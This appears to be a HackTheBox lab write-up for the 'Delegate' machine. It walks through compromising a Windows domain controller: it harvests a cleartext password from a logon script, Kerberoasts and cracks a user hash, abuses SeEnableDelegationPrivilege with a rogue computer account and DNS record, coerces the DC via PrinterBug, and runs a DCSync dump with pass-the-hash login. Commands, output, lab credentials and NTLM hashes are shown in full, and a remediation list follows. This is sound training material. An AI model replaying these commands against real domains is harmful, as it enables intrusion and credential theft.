---
title: "HTB: Delegate"
date: 2025-09-12 12:12:12
categories: [HTB Writeup]
media_subpath: /assets/posts/2025-09-12-htb-delegate/
image: delegate_wide.png
description: Delegate features a vulnerable delegation scenario with the "SeEnableDelegationPrivilege" privilege. In this write-up, I showcase the planning and execution of different attack techniques, including a specific case of unconstrained delegation.
tags: [htb, windows, nmap, netexec, smbclient, bloodyAD, bloodhound-ce-python, targetedKerberoast-py, hashcat, evil-winrm, addcomputer-py, dnstool-py, nslookup, addspn-py, pypykatz, krbrelayx-py, printerbug-py, secretsdump-py, credential-harvesting, dacl-abuse, shadow-credentials, targeted-kerberoasting, unconstrained-delegation, dcsync, SeEnableDelegationPrivilege]
---

{: .centered }
|**OS**|**Difficult**|**Release Date**|
|Windows|Medium|11 Sep 2025|

_Tools Used_\
`nmap`, `netexec`, `smbclient`, `bloodyAD`, `bloodhound-ce-python`, `targetedKerberoast.py`, `hashcat`, `evil-winrm`, `addcomputer.py`, `dnstool.py`, `nslookup`, `addspn.py`, `pypykatz`, `krbrelayx.py`, `printerbug.py`, `secretsdump.py`

## Attack Summary
1. Ran `nxc` and identified guest login was enabled.
2. Ran `smbclient` to enumerate the shares and found valid credentials for `a.briggs`.
3. Identified `a.briggs` had `GenericWrite` over `n.thompson` in BloodHound.
4. Performed Targeted Kerberosting attack against `n.thompson` and cracked its password.
5. Logged in via WinRM as `n.thompson`.
6. Identified `n.thompson` has `SeEnableDelegationPrivilege` privilege.
7. Performed unconstrained delegation attack against the DC, and acquired its TGT.
8. Performed DCSync attack against the DC using the TGT.
9. Logged in as `Administrator` using the dumped hash.

---

## Recon

### Initial Scan

I ran `nmap` and found 27 open TCP ports. I set `--min-rate` to 1500 for faster full port scan. Higher rates can sometimes cause false negatives. The port pattern matches that of a typical Windows AD domain controller.
```
❯ nmap -p- --max-retries 1 --min-rate 1500 --max-scan-delay 20 -T4 --open 10.129.234.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 19:22 CST
Nmap scan report for 10.129.234.69
Host is up (0.21s latency).
Not shown: 65508 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
55452/tcp open  unknown
55622/tcp open  unknown
59033/tcp open  unknown
59081/tcp open  unknown
59082/tcp open  unknown
59086/tcp open  unknown
```
I ran `nmap` again to enumerate services running on the open ports. I noticed RDP and WinRM were up, which could provide a potential entry point later with valid credentials.
```
❯ nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001 10.129.234.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 19:26 CST
Nmap scan report for 10.129.234.69
Host is up (0.21s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-04 11:27:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2025-10-03T10:50:49
|_Not valid after:  2026-04-04T10:50:49
|_ssl-date: 2025-10-04T11:28:04+00:00; +40s from scanner time.
| rdp-ntlm-info:
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-04T11:27:26+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-10-04T11:27:29
|_  start_date: N/A
|_clock-skew: mean: 39s, deviation: 0s, median: 39s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.84 seconds
```
I used `nxc` to generate a hosts file and appended it to `/etc/hosts`.
```
❯ nxc smb 10.129.234.69 --generate-hosts-file hosts
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)

❯ cat hosts
10.129.234.69     DC1.delegate.vl delegate.vl DC1

❯ cat /etc/hosts hosts | sudo sponge /etc/hosts
```

### TCP 445 - SMB

I ran `nxc` to enuemrate shares with guest login, which was successful. No custom share was found.
```
❯ nxc smb 10.129.234.69 -u 'guest' -p '' --shares
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest:
SMB         10.129.234.69   445    DC1              [*] Enumerated shares
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
SMB         10.129.234.69   445    DC1              -----           -----------     ------
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin
SMB         10.129.234.69   445    DC1              C$                              Default share
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share
```

I ran `smbclient` to enumerate the content of the NETLOGON share which normally contains user logon scripts if there is any.
```
❯ smbclient -N //10.129.234.69/NETLOGON
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 26 20:45:24 2023
  ..                                  D        0  Sat Aug 26 17:45:45 2023
  users.bat                           A      159  Sat Aug 26 20:54:29 2023

                4652287 blocks of size 4096. 1011261 blocks available
smb: \> get users.bat
getting file \users.bat of size 159 as users.bat (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> ^C

❯ cat users.bat
rem @echo off
net use * /delete /y
net use v: \\dc1\development

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123 
```

A set of cleartext credentials was found in a logon script.\
`A.Briggs:P4ssw0rd1#123`

## A.Briggs

I ran `nxc` to verify the credential.
```
❯ nxc smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123'
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123
```

I then proceeded to credentialed enumeration. First I wanted to know what privileges the compromised user account possessed. Various tools are good for this task, I like `bloodyAD` for its versatility and intuitive commandline design.
```
❯ bloodyAD -u a.briggs -p 'P4ssw0rd1#123' --dc-ip 10.129.234.69 get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=delegate,DC=vl
permission: WRITE

distinguishedName: CN=A.Briggs,CN=Users,DC=delegate,DC=vl
permission: WRITE

distinguishedName: CN=N.Thompson,CN=Users,DC=delegate,DC=vl
permission: WRITE
```

## N.Thompson

### BloodHound

Now I confirmed the compromised user had write permission on `N.Thompson`. However, I couldn't use the same tool to check `N.Thompson`'s permissions without its credentials due to `bloodyAD`'s limitation. Next I ran `bloodhound-ce-python` to collect AD objects data.
```
❯ bloodhound-ce-python -u a.briggs -p 'P4ssw0rd1#123' -ns 10.129.234.69 -d delegate.vl -dc DC1.delegate.vl -c all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: delegate.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC1.delegate.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC1.delegate.vl
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC1.delegate.vl
INFO: Done in 00M 38S
INFO: Compressing output into 20250912200539_bloodhound.zip
```

I uploaded the zip into the BloodHound-CE, marked `a.briggs` as owned, then ran "Shortest paths from Owned objects" pre-built Cypher query. I found that `a.briggs` had `GenericWrite` permission over `n.thompson`, who was a member of the `REMOTE MANAGEMENT USERS` group.\
![](bh-abriggs-to-nthompson.png)

### (fail) Shadow Credentials Attack

It was tempting to run shadow credentials attack against `n.thompson`. However, when I tried so I encountered `KDC_ERR_PADATA_TYPE_NOSUPP` error. This is because ADCS or CA were not configured in the domain, and the DC did not have its own key pair.
>Prerequisites for shadow credentials attack:
>1. be in a domain that supports PKINIT and containing at least one Domain Controller running Windows Server 2016 or above.
>2. be in a domain where the Domain Controller(s) has its own key pair (for the session key exchange) (e.g. happens when AD CS is enabled or when a certificate authority (CA) is in place).
>3. have control over an account that can edit the target object's msDs-KeyCredentialLink attribute.

### Targeted Kerberoasting

The next attack in line was Targeted Kerberoasting. I ran `targetedKerberoast.py` to get a Kerberoas hash for the `n.thompson` user.
```
❯ tools/targetedKerberoast/targetedKerberoast.py -u a.briggs -p 'P4ssw0rd1#123' --request-user n.thompson -d delegate.vl
[*] Starting kerberoast attacks
[*] Attacking user (n.thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$4840a714fa2318d65e48b8a68e90c25e$aa7a2c47eb888bcb17b3e6129debb42b8a80f2d6f1ebcb102ffc5ddd0305eb55d2765d8c6315ef6cf62416e8e9d7bcfa5f4c31a9e4c2adc68968d3d385151a8dcbdbc6fa599c9ad1ba0dd4118cf73787ca7c8ff632ac6ff598e65662f7bc2a0dd7f57621bddfa994d1ab369be05cf32baa4aa532430c9794a07521b766a988a9466dc2c20818e23b159858f334151de837954133afff44285a0f5edd64a8ec894ffc19e01292f7728a7535ac9dfc1c11bc5edd5c1591f79b056725ec0ed92c34980cf2a367692386e2370aeab8cea5edd31dbe1d9bf278762889c405ea08e7e22e1f9962eb7fc84782bc6834b8a3c957fbc27bcac1fbb80167001ab3bca4b7d679f51dec655cf0082359854ae7c7ed4903258e22663edbac328981198465fe984a0857f6f3701034142a0d698eb7850cd5d7e0c724a32e1e0ff7bff8a32d7edfbaaf1da88b73c0cc5049ff2858d761e59babc3c9716aa25beda4df7e963abb971e8edccab4ba49759dd205f2c377d3ac43ea2214a1c27057e6df8528b382e8eb0f96d244ba26f65284a5b33bfebd3bac8b65d06badc2d4cc06611cd1e8a79995c94277795ffe365cd6b3c39d992593e5ab1f63ecfc4306a37e2a86c9a2a42a3f3a0b443f397ecbf95d417657ed73a91adab766d5f9a9608cda7f2cc53a26ec19a7a17f70ba3746d8a8c48aaf009780b10e6bef2b9ff3ded3baff2a03e0ff05d50a4d1f234190493f477b6401246001285df09d879ead53d46f8c509b9ba2881e424e2d6cf515fd61d29fedf01c4d7fbb142112a6cf99f56bd9db5fe9c69fdf3dfb183b6ff0686ce7f4efdeefc7979027a898ee9c25d13dfce4abe4a9ec3df1dd656990ce0240b8a00df5b1fbf2e851dc6724943d20dff8fb4a347e1ca0ca59c7a5e59ff47949f4fdb02543aa39309413b387d535831640cc2efd894836e1d4239ebbb9304aa5f94dfc78ed6e362100565da233f545aeaa9859a1764e36e0f3c9e8ddc087877e79239216c67f5681702788b28a8482d6fed0ddd8fdfad3177273c2a4cd602716f784bedeea44bc971993e820c610e91c28ba2522a4a2194cf96c007d0b3c163f2626e4e8aa2a8555aad17fb9e29230a8178cc2b1ac7046651f3e94c9fc462d157f874544259d74cb56ab35cea119292f35adf6cea6a46cd826046e13442093db1fb3577d1f6d9159a2524bad8c3e77f900b47e5a3fa56704fd0ebb39384660a0031c043270fb0a08720ced2f77bfa536d3c9dffb274a308339d70cc4a88386111175ca403abce5ea6427fcd542d0b96aa2e9abceae95597ed337b7ddd6ead325635d8c9d0e81e1c493b16803299dec06c2a35ba1df9ae7dfa7b15e949101c8b3f565a68537362582078a595c254cc387888a68694d394922f527f62d63dd1e08ced1ed9b9589b95f8e4f7dac783ae0275f85113c64419230b9b36f2a5b3d
```

Then I ran `hashcat` to crack the hash.
```
❯ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$4840a714fa2318d65e48b8a68e90c25e$aa7a2c47eb888bcb17b3e6129debb42b8a80f2d6f1ebcb102ffc5ddd0305eb55d2765d8c6315ef6cf62416e8e9d7bcfa5f4c31a9e4c2adc68968d3d385151a8dcbdbc6fa599c9ad1ba0dd4118cf73787ca7c8ff632ac6ff598e65662f7bc2a0dd7f57621bddfa994d1ab369be05cf32baa4aa532430c9794a07521b766a988a9466dc2c20818e23b159858f334151de837954133afff44285a0f5edd64a8ec894ffc19e01292f7728a7535ac9dfc1c11bc5edd5c1591f79b056725ec0ed92c34980cf2a367692386e2370aeab8cea5edd31dbe1d9bf278762889c405ea08e7e22e1f9962eb7fc84782bc6834b8a3c957fbc27bcac1fbb80167001ab3bca4b7d679f51dec655cf0082359854ae7c7ed4903258e22663edbac328981198465fe984a0857f6f3701034142a0d698eb7850cd5d7e0c724a32e1e0ff7bff8a32d7edfbaaf1da88b73c0cc5049ff2858d761e59babc3c9716aa25beda4df7e963abb971e8edccab4ba49759dd205f2c377d3ac43ea2214a1c27057e6df8528b382e8eb0f96d244ba26f65284a5b33bfebd3bac8b65d06badc2d4cc06611cd1e8a79995c94277795ffe365cd6b3c39d992593e5ab1f63ecfc4306a37e2a86c9a2a42a3f3a0b443f397ecbf95d417657ed73a91adab766d5f9a9608cda7f2cc53a26ec19a7a17f70ba3746d8a8c48aaf009780b10e6bef2b9ff3ded3baff2a03e0ff05d50a4d1f234190493f477b6401246001285df09d879ead53d46f8c509b9ba2881e424e2d6cf515fd61d29fedf01c4d7fbb142112a6cf99f56bd9db5fe9c69fdf3dfb183b6ff0686ce7f4efdeefc7979027a898ee9c25d13dfce4abe4a9ec3df1dd656990ce0240b8a00df5b1fbf2e851dc6724943d20dff8fb4a347e1ca0ca59c7a5e59ff47949f4fdb02543aa39309413b387d535831640cc2efd894836e1d4239ebbb9304aa5f94dfc78ed6e362100565da233f545aeaa9859a1764e36e0f3c9e8ddc087877e79239216c67f5681702788b28a8482d6fed0ddd8fdfad3177273c2a4cd602716f784bedeea44bc971993e820c610e91c28ba2522a4a2194cf96c007d0b3c163f2626e4e8aa2a8555aad17fb9e29230a8178cc2b1ac7046651f3e94c9fc462d157f874544259d74cb56ab35cea119292f35adf6cea6a46cd826046e13442093db1fb3577d1f6d9159a2524bad8c3e77f900b47e5a3fa56704fd0ebb39384660a0031c043270fb0a08720ced2f77bfa536d3c9dffb274a308339d70cc4a88386111175ca403abce5ea6427fcd542d0b96aa2e9abceae95597ed337b7ddd6ead325635d8c9d0e81e1c493b16803299dec06c2a35ba1df9ae7dfa7b15e949101c8b3f565a68537362582078a595c254cc387888a68694d394922f527f62d63dd1e08ced1ed9b9589b95f8e4f7dac783ae0275f85113c64419230b9b36f2a5b3d:KALEB_2341
```

I ran `nxc` to verify the credentials.
```
❯ nxc smb 10.129.234.69 -u 'n.thompson' -p 'KALEB_2341'
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\n.thompson:KALEB_2341
```

They worked for WinRM.
```
❯ nxc rdp 10.129.234.69 -u 'n.thompson' -p 'KALEB_2341'
RDP         10.129.234.69   3389   DC1              [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC1) (domain:delegate.vl) (nla:True)
RDP         10.129.234.69   3389   DC1              [+] delegate.vl\n.thompson:KALEB_2341

❯ nxc winrm 10.129.234.69 -u 'n.thompson' -p 'KALEB_2341'
WINRM       10.129.234.69   5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.69   5985   DC1              [+] delegate.vl\n.thompson:KALEB_2341 (Pwn3d!)
```

Then I logged in via WinRM as `n.thompson`.
```
❯ evil-winrm -i 10.129.234.69 -u n.thompson -p KALEB_2341

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> cat ../desktop/user.txt
<SNIP>
```

## Administrator

### Enum

There wasn't anything interesting in the root folder or the users folder.
```
*Evil-WinRM* PS C:\users> tree /f /a
Folder PATH listing
Volume serial number is 1753-FC39
C:.
+---Administrator
+---N.Thompson
|   +---Desktop
|   |       user.txt
|   |
|   +---Documents
|   +---Downloads
|   +---Favorites
|   +---Links
|   +---Music
|   +---Pictures
|   +---Saved Games
|   \---Videos
\---Public
```

I checked user's privileges next. Interestingly the user had `SeEnableDelegationPrivilege`, which can be abused for Unconstrained and Constrained delegation attacks to compromise the domain.
```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

### Unconstrained Delegation Attack

The plan is to trick the domain controller into authenticating to a service hosted on a domain-joined computer configured with unconstrained delegation, while the attack machine impersonates that computer. This would allow the attack machine to capture the domain controller's TGT.

I needed to first create a domain-joined computer, assign it unconstrained delegation using the `SeEnableDelegationPrivilege`, then add a malicious DNS record to redirect authentication traffic to the attack machine.

Before executing the attack, I needed to verify that the conditions were met.

I ran `nxc` to confirm that the user was able to create a new computer.
```
❯ nxc ldap 10.129.234.69 -u 'n.thompson' -p 'KALEB_2341' -M maq
LDAP        10.129.234.69   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
LDAP        10.129.234.69   389    DC1              [+] delegate.vl\n.thompson:KALEB_2341
MAQ         10.129.234.69   389    DC1              [*] Getting the MachineAccountQuota
MAQ         10.129.234.69   389    DC1              MachineAccountQuota: 10
```

I ran `nxc` again to confirm that the DC was vulnerable to coercion attacks, which allow it to be coerced into authenticating to a target service.
```
❯ netexec smb dc1.delegate.vl -u tester$ -p Password1 -M coerce_plus
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\tester$:Password1
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, DFSCoerce
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PetitPotam
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PrinterBug
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PrinterBug
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, MSEven
```

With the basic enumeration complete, the attack seemed feasible. I then proceeded to execute the attack.

I ran `addcomputer.py` to create a new computer account.
```
❯ addcomputer.py -computer-name tester$ -computer-pass Password1 delegate.vl/n.thompson:KALEB_2341
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account tester$ with password Password1.
```

I ran `dnstool.py` to add a malicous DNS record pointing to the attack machine.
```
❯ python tools/krbrelayx/dnstool.py -u 'delegate.vl\tester$' -p Password1 -r tester.delegate.vl -d 10.10.14.21 --action add 10.129.234.69
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

I waited a few minutes for the DNS record to update and then verified that it was working.
```
❯ nslookup tester.delegate.vl 10.129.234.69
Server:         10.129.234.69
Address:        10.129.234.69#53

Name:   tester.delegate.vl
Address: <ATTACKER IP>
```

I ran `addspn.py` to add a SPN to the computer account, but it returned an error and suggested using the `--additional` switch.
```
❯ python tools/krbrelayx/addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t tester$ --spn 'cifs/tester.delegate.vl' -dc-ip 10.129.234.69 dc1.delegate.vl

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[!] Could not modify object, the server reports a constrained violation
[!] You either supplied a malformed SPN, or you do not have access rights to add this SPN (Validated write only allows adding SPNs matching the hostname)
[!] To add any SPN in the current domain, use --additional to add the SPN via the msDS-AdditionalDnsHostName attribute
```

I ran again with the switch and it worked.

```
❯ python tools/krbrelayx/addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t tester$ --spn 'cifs/tester.delegate.vl' -dc-ip 10.129.234.69 dc1.delegate.vl --additional

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully

❯ python tools/krbrelayx/addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t tester$ -q -dc-ip 10.129.234.69 dc1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
DN: CN=tester,CN=Computers,DC=delegate,DC=vl - STATUS: Read - READ TIME: 2025-09-12T08:49:03.316786
    msDS-AdditionalDnsHostName: tester.delegate.vl  <---
    sAMAccountName: tester$
```

I ran the original command again and this time it worked, the SPN was successfully added.
```
❯ python tools/krbrelayx/addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t tester$ --spn 'cifs/tester.delegate.vl' -dc-ip 10.129.234.69 dc1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully

htb/labs/Delegate took 2s
❯ python tools/krbrelayx/addspn.py -u 'delegate.vl\n.thompson' -p 'KALEB_2341' -t tester$ -q -dc-ip 10.129.234.69 dc1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
DN: CN=tester,CN=Computers,DC=delegate,DC=vl - STATUS: Read - READ TIME: 2025-10-05T08:52:28.185602
    msDS-AdditionalDnsHostName: tester.delegate.vl
    sAMAccountName: tester$
    servicePrincipalName: cifs/tester.delegate.vl  <---
```

Next, I used `bloodyAD` to add the unconstrained delegation flag to the computer account.
```
❯ bloodyAD -u n.thompson -p 'KALEB_2341' --dc-ip 10.129.234.69 add uac tester$ -f TRUSTED_FOR_DELEGATION
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to tester$'s userAccountControl

❯ bloodyAD -u n.thompson -p 'KALEB_2341' --dc-ip 10.129.234.69 get object tester$ --attr userAccountControl
distinguishedName: CN=tester,CN=Computers,DC=delegate,DC=vl
userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_FOR_DELEGATION  <---
```

To catch the Kerberos authentication from the DC and extract the TGT, I ran `krbrelayx` on the attack machine, and supplied it with the malicious computer account’s NTLM hash. The NTLM hash is simply the MD4 hash of the password in UTF-16LE format. There are various ways to obtain it, but I like using `pypykatz` as it is convenient.
```
❯ pypykatz crypto nt Password1
64f12cddaa88057e06a81b54e73b949b
```
```
❯ python tools/krbrelayx/krbrelayx.py -hashes :64f12cddaa88057e06a81b54e73b949b
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

I then ran `printerbug.py` against the DC to coerce it into authenticating to `tester.delegate.vl`. Note that it is important to specify the FQDN rather than just IP address.
```
❯ python tools/krbrelayx/printerbug.py delegate.vl/n.thompson:KALEB_2341@dc1.delegate.vl tester.delegate.vl
[*] Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Attempting to trigger authentication via rprn RPC at dc1.delegate.vl
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Triggered RPC backconnect, this may or may not have worked
```

The TGT for the DC was captured and saved.
```
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache  <---
[*] SMBD: Received connection from 10.129.234.69
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.234.69
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
```

### DCSync Attack

With the ticket, I ran `secretsdump.py` to perform a DCSync attack against the DC and dumped the NTDS database.
```
❯ KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache secretsdump.py delegate.vl/'DC1$'@dc1.delegate.vl -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
tester$:4601:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
<SNIP>
```

Then I logged in via WinRM as `Administrator` using the dumped hash.
```
❯ evil-winrm -i 10.129.234.69 -u administrator -H c32198ceab4cc695e65045562aa3ee93

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
20c3c***************************
```

## Remediation
Short term
- Disable Guest and anonymous login across SMB and domain.
- Revoke `SeEnableDelegationPrivilege` from non-administrative users.
- Remove plaintext credentials from logon scripts.

Medium term
- Audit and remove users with `GenericWrite` or other powerful ACLs over other accounts unless explicitly required.
- Set `ms-DS-MachineAccountQuota` to 0, and monitor / require approval processess for machine account creation.
- Enforce strong password policy for domain accounts.
- Hardern DNS: restrict who can create/modify records.
- Disable unnecessary services on Domain Controllers. E.g., print spooler.
